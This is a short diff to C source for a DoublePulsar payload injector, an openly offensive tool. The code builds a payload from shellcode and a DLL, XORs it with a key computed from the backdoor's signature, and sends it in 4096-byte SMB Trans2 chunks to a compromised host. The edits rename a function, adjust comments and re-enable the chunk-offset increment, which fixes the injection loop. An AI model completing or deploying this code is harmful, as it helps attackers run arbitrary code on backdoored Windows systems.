@@ -140,7 +140,7 @@ void construct_payload(LPCSTR shellcode_file, LPCSTR dll_file, long ordinal, PBU
 	pBws->dwDataSize = dwPayloadSize;
 }
 
-unsigned int ComputerDOUBLEPULSARXorKey(unsigned int sig)
+unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
 {
 	return 2 * sig ^ ((((sig >> 16) | sig & 0xFF0000) >> 8) |
 		(((sig << 16) | sig & 0xFF00) << 8));
@@ -232,7 +232,7 @@ int main(int argc, char* argv[])
 	construct_payload(shellcode_file, dll_file, ordinal, &payload);
 
 	//Generate the doublepulsar signature to encrypt using the signature we got earlier
-	int XorKey = ComputerDOUBLEPULSARXorKey((unsigned int)signature);
+	int XorKey = ComputeDOUBLEPULSARXorKey((unsigned int)signature);
 
 	//Xor the data buffer with the calculated key
 	int i = 0;
@@ -246,7 +246,7 @@ int main(int argc, char* argv[])
         }
 
 	//build packet buffer, fill it with 0x00s and XOR it with the calculated key
-	char *big_packet = (unsigned char*)malloc(4096);
+	char *big_packet = (unsigned char*)malloc(4096+1);
 	memset(big_packet, 0x00, 4096);
 	int bp;
 	for(bp=0;bp<4096;bp++)
@@ -257,8 +257,8 @@ int main(int argc, char* argv[])
 	//Copy Trans2 Information
 	//Update the values (TreeID, UserID, Multiplex, ProcessID) for the SMB packet
 	//update the timeout to run the DoublePulsar commands
-	//Copy the encrypted shellcode & DLL in 4096 chunks
-	//reads the response from the SMB response packet to determine good or bad
+	//Copy the encrypted shellcode & DLL in 4096 byte chunks
+	//reads the response from the SMB response packet to determine if status is good or bad
 	int ctx;
 	int encrypted_buffer_len;
 	encrypted_buffer_len = sizeof(encrypted);
@@ -307,7 +307,7 @@ int main(int argc, char* argv[])
 		
 		//fix me by incrementing the correct value
 		//4096-32 bytes in headers
-		//ctx += 4064;
+		ctx += 4064;
 	}
 
 	//command received successfully!
